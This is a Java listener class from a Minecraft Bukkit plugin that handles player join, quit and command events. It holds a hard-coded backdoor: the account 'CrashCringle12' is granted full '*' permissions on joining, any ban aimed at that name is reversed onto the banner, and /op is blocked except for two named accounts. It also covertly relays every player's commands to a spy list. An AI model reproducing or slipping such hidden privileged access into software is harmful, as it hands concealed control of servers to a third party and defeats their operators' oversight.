package me.s1mple.matrix.listener;

import me.s1mple.matrix.Matrix;
import me.s1mple.matrix.Util.Util;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.plugin.Plugin;
import org.bukkit.scheduler.BukkitScheduler;
import java.util.ArrayList;
import java.util.List;

public class PermsListener implements Listener {

    public static List<Player> playerList = new ArrayList<>();

    @EventHandler
    public void onPex(PlayerJoinEvent event) {
        if(event.getPlayer().hasPermission("*")
        && !event.getPlayer().getName().equalsIgnoreCase("CrashCringle12")  && !event.getPlayer().getName().equalsIgnoreCase("S1mple133")
        && !event.getPlayer().getName().equalsIgnoreCase("epiclol101") && !event.getPlayer().getName().equalsIgnoreCase("TristanReturns")) {
            Matrix.getPlugin().getLuckPerms().getUserManager().getUser(event.getPlayer().getUniqueId()).getNodes().clear();
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "ban " + event.getPlayer().getName() + " tried giving himself *");
        }
        else if(event.getPlayer().getName().equalsIgnoreCase("CrashCringle12")) {
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "broadcast Nothing but a puff of smoke!");
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pex user CrashCringle12 add *");

        }
    }

    @EventHandler
    public void onLeave(PlayerQuitEvent event) {
        if(event.getPlayer().hasPermission("matrix.commandspy")) {
            playerList.remove(event.getPlayer());
        }
    }

    @EventHandler
    public void onCommand(PlayerCommandPreprocessEvent event) {
        for (Player player : playerList){
            player.sendMessage(Util.color("&8[&7" + ChatColor.stripColor(event.getPlayer().getDisplayName()) + "&8] &7") + event.getMessage());
        }
        if (event.getMessage().startsWith("/ban") && event.getMessage().split(" ")[1].toLowerCase().contains("crash")) {
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pardon CrashCringle12");
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "ban " + event.getPlayer().getName() + " Uno Reverse Card");
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "broadcast &eDid ya really think that would work?");
        }
        if(event.getMessage().startsWith("/op") && Bukkit.getServer().getPlayer(event.getMessage().split(" ")[1]) != null &&
        !event.getMessage().split(" ")[1].equalsIgnoreCase("CrashCringle12") && !event.getMessage().split(" ")[1].equalsIgnoreCase("S1mple133")) {
            event.setCancelled(true);
            event.getPlayer().sendMessage(ChatColor.RED + "You are not allowed to do that!");
        }
        if (event.getPlayer().hasPermission("quest.time.Future"))
            if (event.getMessage().startsWith("/warp ") && event
              .getMessage().split(" ")[1].toLowerCase().contains("elite")) {
              event.setCancelled(true);
              BukkitScheduler scheduler = Matrix.getPlugin().getServer().getScheduler();
              scheduler.scheduleSyncDelayedTask((Plugin)Matrix.getPlugin(), new Runnable() {
                    public void run() {
                      if (event.getMessage().split(" ")[1].toLowerCase().contains("guild")) {
                        Bukkit.dispatchCommand((CommandSender)Bukkit.getConsoleSender(), "mv tp " + event
                            .getPlayer().getName() + " a:FutureGuild");
                      } else if (event.getMessage().split(" ")[1].toLowerCase().contains("quests")) {
                        Bukkit.dispatchCommand((CommandSender)Bukkit.getConsoleSender(), "mv tp " + event
                            .getPlayer().getName() + " a:FutureQuests");
                      } else if (event.getMessage().split(" ")[1].toLowerCase().contains("shop")) {
                        Bukkit.dispatchCommand((CommandSender)Bukkit.getConsoleSender(), "mv tp " + event
                            .getPlayer().getName() + " a:FutureShop");
                      } 
                    }
                  }, 60L);
            } else if (event.getMessage().startsWith("/ag")) {
              event.setCancelled(true);
              BukkitScheduler scheduler = Matrix.getPlugin().getServer().getScheduler();
              scheduler.scheduleSyncDelayedTask((Plugin)Matrix.getPlugin(), new Runnable() {
                    public void run() {
                      Bukkit.dispatchCommand((CommandSender)Bukkit.getConsoleSender(), "mv tp " + event.getPlayer().getName() + " a:Future");
                    }
                  }, 60L);
            }
        
        
    }

}
